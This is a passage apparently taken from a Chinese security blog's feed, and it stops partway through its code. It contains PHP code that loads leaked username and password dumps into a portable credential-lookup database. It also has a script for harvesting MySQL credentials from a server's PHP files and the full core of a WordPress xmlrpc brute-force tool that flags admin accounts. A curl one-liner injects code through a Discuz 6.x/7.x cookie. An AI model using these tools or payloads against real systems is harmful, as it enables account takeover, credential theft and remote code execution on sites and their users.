class="line">$result=<span class="keyword">$this</span>-&gt;r_db-&gt;prepare($sql);</span><br><span class="line">$result-&gt;execute();</span><br><span class="line">$result= $result-&gt;fetch();</span><br><span class="line"><span class="keyword">return</span> $result[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">deleteTable</span><span class="params">()</span></span>&#123;</span><br><span class="line">$db=<span class="keyword">$this</span>-&gt;r_db;   </span><br><span class="line">$sql =<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">drop table if exists <span class="subst">&#123;$this-&gt;r_table&#125;</span>;</span></span><br><span class="line"><span class="string">drop INDEX if exists qq_idx;</span></span><br><span class="line"><span class="string">delete from sqlite_sequence;</span></span><br><span class="line"><span class="string">vacuum;</span></span><br><span class="line">EOF;</span><br><span class="line">$db-&gt;exec($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">import</span><span class="params">()</span></span>&#123;</span><br><span class="line">$db=<span class="keyword">$this</span>-&gt;r_db;</span><br><span class="line">$db-&gt;beginTransaction();</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">1</span>;$i&lt;=<span class="number">10000000</span>;$i++)&#123;</span><br><span class="line">$sql =<span class="string">"insert into &#123;$this-&gt;r_table&#125;('test') VALUES ('&#123;$i&#125;');"</span>;</span><br><span class="line"><span class="comment">//echo $sql.PHP_EOL;</span></span><br><span class="line">$db-&gt;exec($sql);</span><br><span class="line">&#125;</span><br><span class="line">$db-&gt;commit();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">$this</span>-&gt;r_db=<span class="keyword">null</span>;      </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql=<span class="keyword">new</span> sqllite();</span><br><span class="line">$sql-&gt;import();</span><br><span class="line">$t2 = microtime(<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'插入 10000000 条数据'</span>.PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'耗时'</span>.round($t2-$t1,<span class="number">3</span>).<span class="string">'秒'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>下面的例子就是将某文本文件(某数据库)插入数据库<br>建议先用shell命令 处理好 再入库 减少php操作 (如剔除 不规则字符 、转换编码 格式规范)<br>awk sed grep…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"memory_limit"</span>,<span class="string">'-1'</span>);</span><br><span class="line">$table=<span class="string">'sgk'</span>;</span><br><span class="line"></span><br><span class="line">$txt=<span class="string">'moko.txt'</span>;  <span class="comment">//要导入的文本</span></span><br><span class="line">$from=<span class="string">'moko'</span>;    <span class="comment">//数据来源</span></span><br><span class="line"><span class="comment">//$db=$from.'.db3';  //测试临时库名</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">empty</span>($db)?$db=<span class="string">'sgk.db3'</span>:$db;</span><br><span class="line"></span><br><span class="line"><span class="comment">//$index="&#123;$table&#125;_idx";</span></span><br><span class="line"></span><br><span class="line">$db = <span class="keyword">new</span> SQLite3($db);</span><br><span class="line">$s =<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">PRAGMA temp_store = memory;</span></span><br><span class="line"><span class="string">PRAGMA locking_mode = EXCLUSIVE;</span></span><br><span class="line"><span class="string">PRAGMA synchronous = OFF;</span></span><br><span class="line"><span class="string">PRAGMA cache_size = 400000;</span></span><br><span class="line"><span class="string">PRAGMA page_size = 4096;</span></span><br><span class="line"><span class="string">PRAGMA auto_vacuum=NONE;</span></span><br><span class="line"><span class="string">PRAGMA count_changes = OFF;</span></span><br><span class="line"><span class="string">PRAGMA journal_mode = OFF;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">CREATE TABLE IF NOT EXISTS <span class="subst">&#123;$table&#125;</span> (</span></span><br><span class="line"><span class="string">        'id'  INTEGER primary key AUTOINCREMENT NOT NULL,</span></span><br><span class="line"><span class="string">        'uname' char(15) NOT NULL ,</span></span><br><span class="line"><span class="string">        'pass'  char(25)  NOT NULL,</span></span><br><span class="line"><span class="string">'from'  char(15) NULL</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"></span><br><span class="line">$db-&gt;exec($s);</span><br><span class="line"></span><br><span class="line">$sql =<span class="string">"insert into &#123;$table&#125;('uname','pass','from') VALUES (?,?,'&#123;$from&#125;');"</span>;</span><br><span class="line"></span><br><span class="line">$stmt = $db-&gt;prepare($sql);</span><br><span class="line"></span><br><span class="line">$db-&gt;exec(<span class="string">"BEGIN"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">FALSE</span> !==($fp=fopen($txt,<span class="string">'r'</span>)))&#123;</span><br><span class="line"><span class="keyword">while</span>(!feof($fp))&#123;</span><br><span class="line">$buffer=rtrim(fgets($fp));</span><br><span class="line"></span><br><span class="line">@<span class="keyword">list</span>($email,$uname,$pass)=@explode(<span class="string">"----"</span>,$buffer);</span><br><span class="line">@$stmt-&gt;reset();</span><br><span class="line">@$stmt-&gt;clear();</span><br><span class="line">$stmt-&gt;bindValue(<span class="number">1</span>, $email.<span class="string">"\t"</span>.$uname, SQLITE3_TEXT);        </span><br><span class="line">$stmt-&gt;bindValue(<span class="number">2</span>, $pass, SQLITE3_TEXT);</span><br><span class="line">@$stmt-&gt;execute();        </span><br><span class="line">&#125;</span><br><span class="line">$db-&gt;exec(<span class="string">"COMMIT"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其实本文就是提供搭建 可移动社工库的一个思路。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 数据优化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>查找网站文件中mysql连接信息</title>
      <link href="/2015/05/24/web-find-mysql-links/"/>
      <url>/2015/05/24/web-find-mysql-links/</url>
      
        <content type="html"><![CDATA[<p>使用场景：<br>一个服务器上有上千万 <code>php</code>文件<br>如何在里面找出所有 数据库连接信息呢？<br>当然很多人第一个想到的就是用grep 正则匹配<br>但是 数据库连接接字符串很多种形式<br>所以写了个 <code>php</code> 匹配多种形式的 匹配<code>mysql</code>连接 字符串的脚本<br>暂时只写了找php文件中 <code>mysql</code>密码的<br>使用方法，可以将服务器文件弄到本地(尽量在服务器上少作操作)<br>实例：<br><strong>windows cmd下</strong><br>cd 服务器存放网站的目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir /s /b *.php *.inc *.conf *.config &gt;&gt;list.txt</span><br><span class="line">for /f &quot;tokens=*&quot; %i in (list.txt) do  php findpass.php &quot;%i&quot; &gt;&gt;info.txt</span><br></pre></td></tr></table></figure><p>命令自己组合 如有找不到的 请贴出 连接数据库 部分代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">isset</span>($argv[<span class="number">1</span>]) ? $file = trim($argv[<span class="number">1</span>]) : <span class="keyword">exit</span>();</span><br><span class="line">$str = @file_get_contents($file);</span><br><span class="line"></span><br><span class="line">$sql = find_pass($str);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($sql)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'---------------------------------------------'</span> . PHP_EOL;</span><br><span class="line">    <span class="keyword">echo</span> $file . PHP_EOL . PHP_EOL;</span><br><span class="line">    <span class="keyword">foreach</span> ($sql <span class="keyword">as</span> $s) &#123;</span><br><span class="line">        <span class="keyword">echo</span> trim($s) . PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'---------------------------------------------'</span> . PHP_EOL . PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//debug</span></span><br><span class="line"><span class="comment">//else &#123;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//    echo 'false ! =&gt; ' . $file . PHP_EOL;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find_pass</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match_all(<span class="string">'#\$\w*(?:host(?:name)?|server|user(?:name)?|pass(?:word)?)\w*\s*=\s*(?:\'|\")[[:alnum:][:punct:]]+(?:\'|\")#ism'</span>, $str, $sqlstr)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (count($sqlstr[<span class="number">0</span>]) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">//echo "No 1" . PHP_EOL;</span></span><br><span class="line">            <span class="keyword">return</span> array_unique($sqlstr[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (preg_match_all(<span class="string">'#mysqli?(?:_p?connect)?\((?:\'|\")([[:alnum:][:punct:]]*)(?:\'|\")\s*,\s*(?:\'|\")([[:alnum:][:punct:]]*)(?:\'|\")\s*,\s*(?:\'|\")([[:alnum:][:punct:]]*)(?:\'|\")#im'</span>, $str, $sqlstr)) &#123;</span><br><span class="line">        <span class="comment">//echo "No 2" . PHP_EOL;</span></span><br><span class="line">        <span class="keyword">return</span> array_unique($sqlstr[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match_all(<span class="string">'#\$[\w]+-&gt;db(?:Host|Name|User|Pass)\s+?=\s*\'(.*?)\';#im'</span>, $str, $sqlstr)) &#123;</span><br><span class="line">       <span class="comment">// echo "No 3" . PHP_EOL;</span></span><br><span class="line">        <span class="keyword">return</span> array_unique($sqlstr[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match_all(<span class="string">'#^((?!\*).)*(mysqli?:\/\/(?!username:password)[[:alnum:][:punct:]]+@[[:alnum:][:punct:]]*\/[[:alnum:][:punct:]]*)(?:\'|\")#im'</span>, $str, $sqlstr)) &#123;</span><br><span class="line">        <span class="comment">//echo "No 4" . PHP_EOL;</span></span><br><span class="line">        <span class="keyword">return</span> array_unique($sqlstr[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match_all(<span class="string">'#^((?!\#|\/\/|\*).)*define\s*\((?:\'|\")(?:\w*SERVER\w*|\w*USER\w*|\w*PASS(?:WORD)?\w*|\w*HOST\w*)(?:\'|\"),\s*(?:\'|\")(.*)(?:\'|\")\)#im'</span>, $str, $sqlstr)) &#123;</span><br><span class="line">       <span class="comment">// echo "No 5" . PHP_EOL;</span></span><br><span class="line">        <span class="keyword">return</span> array_unique($sqlstr[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match_all(<span class="string">'#\[database\]\s*driver\s*?=\s*?.*\s*host\s*?=\s*?(?:\'|\")(.*)(?:\'|\")\s*?username\s*?=\s*?(.*)\s*?password\s*?=\s*?(.*)#im'</span>, $str, $sqlstr)) &#123;</span><br><span class="line">      <span class="comment">//  echo "No 6" . PHP_EOL;</span></span><br><span class="line">        <span class="keyword">return</span> array_unique($sqlstr[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (preg_match_all(<span class="string">'#^((?!\*).)*(?:\'|\")[[:alnum:][:punct:]]*(?:server|user|login|pass|host)[[:alnum:][:punct:]]*(?:\'|\")\s=&gt;\s*[[:alnum:][:punct:]]+(?:\'|\")#im'</span>, $str, $sqlstr)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (count($sqlstr[<span class="number">0</span>]) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">           <span class="comment">// echo "No 7" . PHP_EOL;</span></span><br><span class="line">            <span class="keyword">return</span> array_unique($sqlstr[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match_all(<span class="string">'#\$[\w\[\]\'\"\s]*(?:host|server|user|name|pass|password|dbpw|hn|un|pw)\w*[\w\[\]\'\"\s]*=\s*(?:\'|\")[[:alnum:][:punct:]]+(?:\'|\")#im'</span>, $str, $sqlstr)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (count($sqlstr[<span class="number">0</span>]) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">         <span class="comment">//   echo "No 8" . PHP_EOL;</span></span><br><span class="line">            <span class="keyword">return</span> array_unique($sqlstr[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (preg_match_all(<span class="string">'#new\sPDO\((?:\'|\")([\w[:punct:]]+)(?:\'|\")\s*,\s*(?:\'|\")([\w[:punct:]]+)\s*,\s*(?:\'|\")([\w[:punct:]]+)(?:\'|\")\)#im'</span>, $str, $sqlstr)) &#123;</span><br><span class="line">        <span class="comment">//echo "No 9" . PHP_EOL;</span></span><br><span class="line">        <span class="keyword">return</span> $sqlstr[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (preg_match_all(<span class="string">'#connect\(\'([[:alnum:][:punct:]]+)\'\s*,\s*\'([[:alnum:][:punct:]]+)\'\s*,\s*\'([[:alnum:][:punct:]]+)\'\s*,\s*\'[[:alnum:][:punct:]]+\'\)#im'</span>, $str, $sqlstr)) &#123;</span><br><span class="line">      <span class="comment">//  echo "No 10" . PHP_EOL;</span></span><br><span class="line">        <span class="keyword">return</span> $sqlstr[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (preg_match_all(<span class="string">'#db_(?:host|login|password|user|username):\s*[[:alnum:][:punct:]]+#im'</span>, $str, $sqlstr)) &#123;</span><br><span class="line">       <span class="comment">// echo "No 11" . PHP_EOL;</span></span><br><span class="line">        <span class="keyword">return</span> $sqlstr[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 实用脚本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wordpress 用户枚举，爆破工具</title>
      <link href="/2015/02/06/wordpress-brute/"/>
      <url>/2015/02/06/wordpress-brute/</url>
      
        <content type="html"><![CDATA[<blockquote><p>欢迎对该工具进行修改优化，转载请注明原作者，写代码不易。</p></blockquote><p><strong>为什么不用<code>wpscan</code>?</strong></p><blockquote><p>闲着蛋疼写着玩。</p></blockquote><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/32348811296e75c15082c635cb39fde1.png" alt="2019-07-21-00-46-17"></p><p><strong>核心代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'init.php'</span>;</span><br><span class="line">define(<span class="string">"user"</span>, $argv[<span class="number">2</span>]);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BruteWordPress</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $rc;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rc = <span class="keyword">new</span> RollingCurl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rc-&gt;callback = <span class="keyword">$this</span>-&gt;create_request_callback(<span class="keyword">$this</span>-&gt;rc);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rc-&gt;__set(<span class="string">'window_size'</span>, Thread);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rc-&gt;__set(<span class="string">'time_out'</span>, TimeOut);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">create_request_callback</span><span class="params">($rc)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="params">($response, $info, $request)</span> <span class="title">use</span> <span class="params">($rc)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> ($info[<span class="string">'http_code'</span>] == <span class="number">404</span> || $info[<span class="string">'http_code'</span>] == <span class="number">403</span> || $info[<span class="string">'http_code'</span>] == <span class="number">500</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'[-] Access error!'</span> . PHP_EOL;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;rc-&gt;cancelRequests();</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            $p = $request-&gt;post_data;</span><br><span class="line">            preg_match_all(<span class="string">'/&lt;param&gt;&lt;value&gt;([^\s]+?)&lt;\/value&gt;&lt;\/param&gt;/'</span>, $p, $m);</span><br><span class="line">            $user = $m[<span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">            $pass = $m[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/&lt;boolean&gt;(\d)&lt;\/boolean&gt;/'</span>, $response, $is_admin)) &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="comment">//echo '[*] Brote user ' . $user . " ..." . "\r";</span></span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="comment">//print_r($is_admin).PHP_EOL;</span></span><br><span class="line">                <span class="keyword">if</span> ($is_admin[<span class="number">1</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'[+] Bruteed~ -&gt; '</span> . iconv(<span class="string">"UTF-8"</span>,<span class="string">"GB18030//IGNORE"</span>,$user)  . <span class="string">':'</span> . $pass . <span class="string">' [is admin]'</span> . PHP_EOL;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;rc-&gt;cancelRequests();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'[+] Bruteed~ -&gt; '</span> . iconv(<span class="string">"UTF-8"</span>,<span class="string">"GB18030//IGNORE"</span>,$user)  . <span class="string">':'</span> . $pass . PHP_EOL;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;rc-&gt;cancelRequests();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $pass_file = preg_replace(<span class="string">'/\s$/'</span>, <span class="string">""</span>, file(wordlist));</span><br><span class="line">        $user_pre = <span class="keyword">array</span>(<span class="string">'123'</span>, <span class="string">'111'</span>, <span class="string">'1'</span>, <span class="string">'a'</span>, <span class="string">'pass'</span>, <span class="string">'!@#'</span>, <span class="string">'password'</span>, <span class="string">'abc'</span>, <span class="string">'1961'</span>, <span class="string">'1962'</span>, <span class="string">'1963'</span>, <span class="string">'1970'</span>, <span class="string">'1988'</span>, <span class="string">'1989'</span>, <span class="string">'1990'</span>, <span class="string">'1991'</span>, <span class="string">'1992'</span>, <span class="string">'1993'</span>, <span class="string">'1994'</span>, <span class="string">'1995'</span>, <span class="string">'1996'</span>, <span class="string">'1997'</span>, <span class="string">'1998'</span>, <span class="string">'1999'</span>, <span class="string">'2001'</span>, <span class="string">'2002'</span>, <span class="string">'2003'</span>, <span class="string">'2004'</span>, <span class="string">'2006'</span>, <span class="string">'2005'</span>, <span class="string">'2007'</span>, <span class="string">'2008'</span>, <span class="string">'2009'</span>, <span class="string">'2010'</span>, <span class="string">'2011'</span>, <span class="string">'2012'</span>, <span class="string">'2013'</span>, <span class="string">'2014'</span>, <span class="string">'2015'</span>);</span><br><span class="line">        <span class="keyword">foreach</span> ($user_pre <span class="keyword">as</span> $pre) &#123;</span><br><span class="line">            $pre_u[] = user . $pre;</span><br><span class="line">        &#125;</span><br><span class="line">        $p = array_merge($pre_u, $pass_file);</span><br><span class="line">        $passwords = array_unique($p);</span><br><span class="line">        array_unshift($passwords, user);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">foreach</span> ($passwords <span class="keyword">as</span> $pass) &#123;</span><br><span class="line">            $url = domain . <span class="string">'/xmlrpc.php'</span>;</span><br><span class="line">            $post_data = sprintf(<span class="string">'&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;%s&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;%s&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;'</span>, user, $pass);</span><br><span class="line">            $request = <span class="keyword">new</span> RollingCurlRequest($url, <span class="string">'POST'</span>, $post_data);</span><br><span class="line">            $request-&gt;options = $GLOBALS[<span class="string">"cUrl_options"</span>]; </span><br><span class="line">            <span class="keyword">$this</span>-&gt;rc-&gt;add($request);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rc-&gt;execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$brute = <span class="keyword">new</span> BruteWordPress();</span><br><span class="line">$brute-&gt;run();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>说明:</strong></p><ol><li><p>使用非常简单无需其它参数<br><code>php scan.php http://www.target.com</code></p></li><li><p>多线程同时进行,跑完一个用户成功立即退出该任务接着破另外一个用户</p></li><li><p>自动生成用户名相关并加到字典头部 大大的提高破解速度</p></li><li><p>模块可单独使用</p></li><li><p>枚举用户模块 能抓取大部分常规 wordpress站点用户<br>检查枚举到的用户是否为登陆用户如果不是则剔除大大的提高破解效率</p></li><li><p>该脚本 需curl 扩展支持</p></li><li><p>利用wordpress 的xmlrpc.php 文件破解<br>可绕过限制并判断是否为管理员用户</p></li><li><p>环境简单<br>仅需 php.exe 、php5ts.dll 、curl.dll </p></li></ol><p><strong>文件说明</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">init.php 配置及功能函数</span><br><span class="line">enum_user.php 根据页面枚举用户</span><br><span class="line">chkuser.php 检测枚举到的用户是否为可登陆用户</span><br><span class="line">RollingCurl.php 多线程http请求类 （修改版）</span><br><span class="line">BruteWordPress.php 爆破类</span><br><span class="line">scan.php 主文件(要运行的文件)</span><br></pre></td></tr></table></figure><p><a href="https://wolvez.oss-cn-hangzhou.aliyuncs.com/files/php.zip" target="_blank" rel="noopener">绿色php环境</a><br><a href="https://wolvez.oss-cn-hangzhou.aliyuncs.com/files/wpbt.zip" target="_blank" rel="noopener">完整代码下载</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> php控 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Discuz! 6.x/7.x 批量检测脚本</title>
      <link href="/2014/11/25/Discuz6-x-7-x-exp/"/>
      <url>/2014/11/25/Discuz6-x-7-x-exp/</url>
      
        <content type="html"><![CDATA[<blockquote><p>用法 先 用抓取url工具 抓取 若干 url (url为 带表情的帖子，或回复)<br>存放至 dz.txt 文件 然后执行本脚本</p></blockquote><p><a href="https://www.t00ls.net/viewthread.php?tid=28573&extra=&page=9" target="_blank" rel="noopener">漏洞利用请关注</a> 第82楼</p><p><strong>单个测试语句(windows)：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">'http://bbs.test.com/viewthread.php?tid=29958'</span> -s --cookie <span class="string">'GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();'</span> |findstr /i /c:<span class="string">'&lt;h2&gt;PHP License&lt;/h2&gt;'</span></span><br></pre></td></tr></table></figure><p>有返回说明有洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 